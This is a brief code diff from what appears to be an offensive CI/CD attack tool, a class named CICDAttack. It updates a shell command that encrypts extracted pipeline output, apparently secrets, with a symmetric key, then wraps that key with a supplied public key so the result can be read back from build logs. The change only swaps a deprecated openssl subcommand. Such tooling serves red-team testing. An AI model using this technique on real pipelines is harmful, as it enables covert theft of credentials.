@@ -124,8 +124,8 @@ class CICDAttack():
                            f"{echo_cmd} | openssl enc -aes-256-cbc -kfile "
                            "sym.key -pbkdf2 | base64 -w 0 | tr -d '\\n';"
                            f"echo '$'; echo -n '$'; cat sym.key | base64 | "
-                           "openssl rsautl -encrypt -inkey "
-                           f"<(echo \"${pkey_varname}\") -pubin -pkcs | "
+                           "openssl pkeyutl -encrypt -inkey "
+                           f"<(echo \"${pkey_varname}\") -pubin -pkcs1 | "
                            "base64 -w 0 | tr -d '\\n'; echo '$'"
                 }
             ]
